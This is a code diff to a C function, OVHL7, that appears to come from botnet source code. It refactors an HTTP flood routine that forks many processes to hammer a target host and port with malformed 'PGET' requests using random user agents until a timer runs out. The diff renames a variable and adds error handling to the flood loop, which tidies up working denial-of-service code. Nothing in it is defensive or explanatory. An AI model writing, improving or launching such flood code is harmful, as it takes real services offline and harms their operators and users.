@@ -4,8 +4,8 @@ extern const char *useragents[];
 
 void OVHL7(char *host, in_port_t port, int timeEnd, int power)
 {
-	int socket, error = 0, i, end = time(NULL) + timeEnd, sendIP = 0;
-	char request[512], buffer[1], pgetData[2048];
+    int sock, error = 0, i, end = time(NULL) + timeEnd, sendIP = 0;
+    char request[512], buffer[1], pgetData[2048];
 	sprintf(pgetData, "\x00", "\x01", "\x02",
 			"\x0a", "\x0b", "\x0c", "\x0d", "\x0e", "\x0f", "\x10",
 			"\x11", "\x12", "\x13", "\x14", "\x15", "\x16", "\x17",
@@ -42,24 +42,39 @@ void OVHL7(char *host, in_port_t port, int timeEnd, int power)
 			"\xea", "\xeb", "\xec", "\xed", "\xee", "\xef", "\xf0",
 			"\xf1", "\xf2", "\xf3", "\xf4", "\xf5", "\xf6", "\xf7",
 			"\xf8", "\xf9", "\xfa", "\xfb", "\xfc", "\xfd", "\xfe", "\xff");
-	for (i = 0; i < power; i++)
-	{
-		if (fork())
-		{
-			sprintf(request, "PGET \0\0\0\0\0\0%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", pgetData, host, useragents[(rand() % 58)]);
-			while (end > time(NULL))
-			{
-				socket = socket_connect(host, port);
-				if (socket != 0)
-				{
-					i = 0;
-					while (i++ < power * 2 && error != -1)
-						error = write(socket, request, strlen(request));
-					read(socket, buffer, 1);
-					close(socket);
-				}
-			}
-			exit(0);
-		}
-	}
+    for (i = 0; i < power; i++)
+    {
+        if (fork())
+        {
+            sprintf(request, "PGET \0\0\0\0\0\0%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", pgetData, host, useragents[(rand() % 58)]);
+            while (end > time(NULL))
+            {
+                sock = socket_connect(host, port);
+                if (sock < 0) {
+                    perror("socket_connect");
+                    return;
+                }
+
+                i = 0;
+                while (i++ < power * 2 && error != -1) {
+                    error = write(sock, request, strlen(request));
+                    if (error < 0) {
+                        perror("write");
+                        close(sock);
+                        return;
+                    }
+                }
+
+                error = read(sock, buffer, 1);
+                if (error < 0) {
+                    perror("read");
+                    close(sock);
+                    return;
+                }
+
+                close(sock);
+            }
+            exit(0);
+        }
+    }
 }
